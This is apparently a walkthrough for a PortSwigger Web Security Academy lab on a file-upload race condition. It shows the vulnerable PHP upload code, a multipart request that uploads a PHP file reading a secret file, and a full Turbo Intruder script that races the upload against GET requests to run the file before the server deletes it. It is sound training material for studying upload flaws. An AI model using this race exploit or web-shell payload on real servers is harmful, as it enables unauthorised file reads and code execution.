## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/914556ea-6f29-45f9-a758-f4299e8aff18)

The vulnerable code that introduces this race condition is as follows:

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```
## Overview :

 Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it. 

## Solution :

In the source code in the HINT, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed. 


When we upload a jpg or png image, it is sucessfully uploaded but when we upload a php file it is not.

The request sent when uploading the file is as follows,

```http
POST /my-account/avatar HTTP/2
Host: 0ad000ee03ff349488b6ffd300a70063.web-security-academy.net
Cookie: session=D3xgs3pRL7IRTGBSbWYVm062htgTuqyM
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------347008415039430862643146782233
Content-Length: 543
Origin: https://0ad000ee03ff349488b6ffd300a70063.web-security-academy.net
Referer: https://0ad000ee03ff349488b6ffd300a70063.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------347008415039430862643146782233
Content-Disposition: form-data; name="avatar"; filename="read.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------347008415039430862643146782233
Content-Disposition: form-data; name="user"

wiener
-----------------------------347008415039430862643146782233
Content-Disposition: form-data; name="csrf"

14YoiPx7PojQdqNsQczy8HdKntOfFmOb
-----------------------------347008415039430862643146782233--
```

Send the request to **Turbo Intruder**.

Paste the following python code -

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

In the script, replace

- `<YOUR-POST-REQUEST>` with the entire POST request (**POST /my-account/avatar**)
- `<YOUR-GET-REQUEST>` with the entire GET request (**GET /files/avatars/read.php**)

The final payload - 

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0ad000ee03ff349488b6ffd300a70063.web-security-academy.net
Cookie: session=D3xgs3pRL7IRTGBSbWYVm062htgTuqyM
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------347008415039430862643146782233
Content-Length: 543
Origin: https://0ad000ee03ff349488b6ffd300a70063.web-security-academy.net
Referer: https://0ad000ee03ff349488b6ffd300a70063.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------347008415039430862643146782233
Content-Disposition: form-data; name="avatar"; filename="read.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------347008415039430862643146782233
Content-Disposition: form-data; name="user"

wiener
-----------------------------347008415039430862643146782233
Content-Disposition: form-data; name="csrf"

14YoiPx7PojQdqNsQczy8HdKntOfFmOb
-----------------------------347008415039430862643146782233--
'''

    request2 = '''GET /files/avatars/read.php HTTP/2
Host: 0ad000ee03ff349488b6ffd300a70063.web-security-academy.net
Cookie: session=D3xgs3pRL7IRTGBSbWYVm062htgTuqyM
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Click on **ATTACK** to start the attack.

In the results list, there some of the **GET requests received a 200 response** containing Carlos's secret. T**hese requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted**. 


![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9bad09c4-2884-4194-b49d-e3efe6f2cc5a)

Submit the secret to solve the lab.

SECRET - `2ytyOEzFnkFGyh9rKrJvEZHqBZs0p534`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c98da30c-f466-4741-b2c7-6c7967102c7d)

